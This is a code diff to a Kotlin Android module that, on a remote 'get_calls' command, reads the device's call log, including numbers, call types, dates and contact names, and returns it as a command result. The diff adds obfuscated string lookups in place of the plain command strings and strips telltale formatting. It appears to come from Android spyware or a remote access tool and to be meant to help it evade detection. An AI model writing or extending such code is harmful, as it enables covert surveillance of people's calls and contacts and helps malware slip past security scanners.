@@ -5,11 +5,12 @@ import android.provider.CallLog
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
+import com.nexlink.bridge.ObfStr
 
 internal object CallLogModule {
     fun execute(ctx: Context, command: String): Pair<String, String> {
-        val limit = command.substringAfter("get_calls:", "").toIntOrNull() ?: 50
-        return Pair(getCalls(ctx, limit), "command_result")
+        val limit = command.substringAfter(ObfStr.cmdCallsPrefix(), "").toIntOrNull() ?: 50
+        return Pair(getCalls(ctx, limit), ObfStr.cmdResult())
     }
     private fun getCalls(ctx: Context, limit: Int): String {
         return try {
@@ -17,17 +18,17 @@ internal object CallLogModule {
                 CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.CACHED_NAME)
             val cur = ctx.contentResolver.query(CallLog.Calls.CONTENT_URI, proj,
                 null, null, "${CallLog.Calls.DATE} DESC")
-                ?: return "⚠️ Cannot read call log"
+                ?: return "Cannot read call log"
             val fmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
-            val sb  = StringBuilder("=== Call Log (last $limit) ===\n")
+            val sb  = StringBuilder("Call Log (last $limit)\n")
             var n   = 0
             cur.use {
                 while (it.moveToNext() && n < limit) {
                     val num  = it.getString(0) ?: "?"
                     val type = when (it.getInt(1)) {
-                        CallLog.Calls.INCOMING_TYPE -> "📲IN "
-                        CallLog.Calls.OUTGOING_TYPE -> "📞OUT"
-                        CallLog.Calls.MISSED_TYPE   -> "❌MIS"
+                        CallLog.Calls.INCOMING_TYPE -> "IN "
+                        CallLog.Calls.OUTGOING_TYPE -> "OUT"
+                        CallLog.Calls.MISSED_TYPE   -> "MIS"
                         else -> "OTHER"
                     }
                     val date = fmt.format(Date(it.getLong(2)))
@@ -37,7 +38,7 @@ internal object CallLogModule {
                     n++
                 }
             }
-            if (n == 0) sb.append("No calls found") else sb.appendLine("\nTotal: $n")
+            if (n == 0) sb.append("Empty") else sb.appendLine("\nTotal: $n")
             sb.toString()
         } catch (e: Exception) { "Error: ${e.message}" }
     }
